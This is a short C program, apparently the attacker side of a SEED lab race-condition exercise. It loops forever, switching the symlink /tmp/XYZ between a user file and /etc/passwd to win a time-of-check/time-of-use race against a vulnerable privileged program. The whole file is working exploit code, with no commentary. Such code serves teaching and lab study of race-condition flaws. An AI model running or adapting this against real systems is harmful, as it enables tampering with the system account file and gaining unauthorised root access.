#include<unistd.h>

int main()
{
	while(1)
	{

		system("ln -sf /home/seed/mylife /tmp/XYZ"); 
		usleep(100000);
		system("ln -sf /etc/passwd /tmp/XYZ");
		usleep(100000);
	}
}
